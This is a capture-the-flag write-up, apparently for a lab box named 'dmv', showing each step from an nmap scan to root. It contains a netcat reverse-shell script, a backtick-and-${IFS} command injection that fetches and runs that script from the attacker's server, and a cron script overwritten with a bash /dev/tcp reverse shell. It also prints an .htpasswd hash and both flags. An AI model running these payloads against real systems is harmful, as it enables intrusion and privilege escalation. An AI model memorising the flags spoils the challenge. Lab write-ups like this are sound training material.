
1. Start with nmap. Admin was the shared folder. 
```
┌──(kali㉿kali)-[~]
└─$ nmap --script vuln -p 22,80 10.10.138.81
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 22:09 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.138.81
Host is up (0.56s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder (401 Unauthorized)
|   /admin/admin/: Possible admin folder (401 Unauthorized)
|   /admin/account.php: Possible admin folder (401 Unauthorized)
|   /admin/index.php: Possible admin folder (401 Unauthorized)
|   /admin/login.php: Possible admin folder (401 Unauthorized)
|   /admin/admin.php: Possible admin folder (401 Unauthorized)
|   /admin/index.html: Possible admin folder (401 Unauthorized)
|   /admin/login.html: Possible admin folder (401 Unauthorized)
|   /admin/admin.html: Possible admin folder (401 Unauthorized)
|   /admin/home.php: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.php: Possible admin folder (401 Unauthorized)
|   /admin/account.html: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.html: Possible admin folder (401 Unauthorized)
|   /admin/cp.php: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.php: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.php: Possible admin folder (401 Unauthorized)
|   /admin/home.html: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.html: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.html: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.html: Possible admin folder (401 Unauthorized)
|   /admin/cp.html: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.php: Possible admin folder (401 Unauthorized)
|   /admin/account.cfm: Possible admin folder (401 Unauthorized)
|   /admin/index.cfm: Possible admin folder (401 Unauthorized)
|   /admin/login.cfm: Possible admin folder (401 Unauthorized)
|   /admin/admin.cfm: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.cfm: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.cfm: Possible admin folder (401 Unauthorized)
|   /admin/cp.cfm: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.cfm: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.cfm: Possible admin folder (401 Unauthorized)
|   /admin/home.cfm: Possible admin folder (401 Unauthorized)
|   /admin/account.asp: Possible admin folder (401 Unauthorized)
|   /admin/index.asp: Possible admin folder (401 Unauthorized)
|   /admin/login.asp: Possible admin folder (401 Unauthorized)
|   /admin/admin.asp: Possible admin folder (401 Unauthorized)
|   /admin/home.asp: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.asp: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.asp: Possible admin folder (401 Unauthorized)
|   /admin/cp.asp: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.asp: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.asp: Possible admin folder (401 Unauthorized)
|   /admin/account.aspx: Possible admin folder (401 Unauthorized)
|   /admin/index.aspx: Possible admin folder (401 Unauthorized)
|   /admin/login.aspx: Possible admin folder (401 Unauthorized)
|   /admin/admin.aspx: Possible admin folder (401 Unauthorized)
|   /admin/home.aspx: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.aspx: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.aspx: Possible admin folder (401 Unauthorized)
|   /admin/cp.aspx: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.aspx: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.aspx: Possible admin folder (401 Unauthorized)
|   /admin/index.jsp: Possible admin folder (401 Unauthorized)
|   /admin/login.jsp: Possible admin folder (401 Unauthorized)
|   /admin/admin.jsp: Possible admin folder (401 Unauthorized)
|   /admin/home.jsp: Possible admin folder (401 Unauthorized)
|   /admin/controlpanel.jsp: Possible admin folder (401 Unauthorized)
|   /admin/admin-login.jsp: Possible admin folder (401 Unauthorized)
|   /admin/cp.jsp: Possible admin folder (401 Unauthorized)
|   /admin/account.jsp: Possible admin folder (401 Unauthorized)
|   /admin/admin_login.jsp: Possible admin folder (401 Unauthorized)
|   /admin/adminLogin.jsp: Possible admin folder (401 Unauthorized)
|   /admin/backup/: Possible backup (401 Unauthorized)
|   /admin/download/backup.sql: Possible database backup (401 Unauthorized)
|   /admin/upload.php: Admin File Upload (401 Unauthorized)
|   /admin/CiscoAdmin.jhtml: Cisco Collaboration Server (401 Unauthorized)
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS (401 Unauthorized)
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload (401 Unauthorized)
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload (401 Unauthorized)
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload (401 Unauthorized)
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload (401 Unauthorized)
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload (401 Unauthorized)
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload (401 Unauthorized)
|   /admin/jscript/upload.asp: Lizard Cart/Remote File upload (401 Unauthorized)
|_  /admin/environment.xml: Moodle files (401 Unauthorized)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-dombased-xss: Couldn't find any DOM based XSS.

Nmap done: 1 IP address (1 host up) scanned in 151.42 seconds

```

2. Intercept the webpage with burpsuite and send it to repeater. 

3. Create a file script.sh with netcat reverse shell code. Also run http server. 
```
┌──(kali㉿kali)-[~]
└─$ cat script.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.159.78 1234 >/tmp/f


┌──(kali㉿kali)-[~]
└─$ python -m http.server 444                                           
Serving HTTP on 0.0.0.0 port 444 (http://0.0.0.0:444/) ...
10.8.159.78 - - [18/Sep/2023 22:14:06] "GET / HTTP/1.1" 200 -
10.8.159.78 - - [18/Sep/2023 22:14:06] code 404, message File not found
10.8.159.78 - - [18/Sep/2023 22:14:06] "GET /favicon.ico HTTP/1.1" 404 -
10.8.159.78 - - [18/Sep/2023 22:18:03] "GET / HTTP/1.1" 200 -
10.8.159.78 - - [18/Sep/2023 22:18:03] "GET / HTTP/1.1" 200 -
10.8.159.78 - - [18/Sep/2023 22:18:03] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 22:27:39] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 22:27:39] code 404, message File not found
127.0.0.1 - - [18/Sep/2023 22:27:39] "GET /favicon.ico HTTP/1.1" 404 -
10.10.138.81 - - [18/Sep/2023 22:32:19] "GET /script.sh HTTP/1.1" 200 -

```

4. Upload it using burpsuite and run it another time. 
```
yt_url=`wget${IFS}http://10.8.159.78:444/script.sh'

yt_url=`bash${IFS}script.s'
```

5. Listened in another terminal and make it interactive. 
```
python -c 'import pty;pty.spawn("/bin/bash");'
```

6. Question 2. 
```
www-data@dmv:/var/www/html/admin$ cat .htpasswd
cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

```

7. Obtained user flag. 
```
www-data@dmv:/var/www/html/admin$ cat flag.txt
cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}

```

8. Look for capabilities. 
```
www-data@dmv:/var/www/html/admin$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
www-data@dmv:/var/www/html/admin$ ps aux | grep "^root"
```

9. Upload pspy64 file from local machine to this user. 
```
┌──(kali㉿kali)-[~]
└─$ python -m http.server 444
Serving HTTP on 0.0.0.0 port 444 (http://0.0.0.0:444/) ...
10.8.159.78 - - [18/Sep/2023 23:10:57] "GET / HTTP/1.1" 200 -
10.10.138.81 - - [18/Sep/2023 23:11:32] "GET /pspy64 HTTP/1.1" 200 -
10.8.159.78 - - [18/Sep/2023 23:12:57] "GET / HTTP/1.1" 200 -



www-data@dmv:/var/www/html$ wget http://10.8.159.78:444/pspy64
wget http://10.8.159.78:444/pspy64
--2023-09-19 03:11:32--  http://10.8.159.78:444/pspy64
Connecting to 10.8.159.78:444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.96M   568KB/s    in 8.4s    

2023-09-19 03:11:41 (362 KB/s) - 'pspy64' saved [3104768/3104768]
```

10. Make it executable and run it. 
```
www-data@dmv:/var/www/html$ chmod 777 pspy64
chmod 777 pspy64
www-data@dmv:/var/www/html$ ./pspy64

```

11. Disconnect user access, then reconnect and have a look on /tmp/clean.sh file. 

12. Edit clean.sh file with bash reverse shell command and then listened on another terminal. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1234
[sudo] password for kali: 
listening on [any] 1234 ...
connect to [10.8.159.78] from (UNKNOWN) [10.10.138.81] 50048
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash");'
www-data@dmv:/var/www/html$ ls
ls
admin  images  index.php  js  pspy64  script.sh  style.css  tmp
www-data@dmv:/var/www/html$ cd tmp
cd tmp
www-data@dmv:/var/www/html/tmp$ ls
ls
clean.sh
www-data@dmv:/var/www/html/tmp$ echo 'bash -i >& /dev/tcp/10.8.159.78/888 0>&1' > clean.sh
<ash -i >& /dev/tcp/10.8.159.78/888 0>&1' > clean.sh
www-data@dmv:/var/www/html/tmp$ cat clean.sh
cat clean.sh
bash -i >& /dev/tcp/10.8.159.78/888 0>&1

```

13. Wait for a while for cron job to do its job. Rooted and obtained root file. 
```
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 888  
[sudo] password for kali: 
listening on [any] 888 ...
connect to [10.8.159.78] from (UNKNOWN) [10.10.138.81] 57644
bash: cannot set terminal process group (2042): Inappropriate ioctl for device
bash: no job control in this shell
root@dmv:/var/www/html/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dmv:/var/www/html/tmp# whoami
whoami
root
root@dmv:/var/www/html/tmp# ls
ls
clean.sh
root@dmv:/var/www/html/tmp# cd
cd
root@dmv:~# ls
ls
root.txt
root@dmv:~# cat root.txt
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```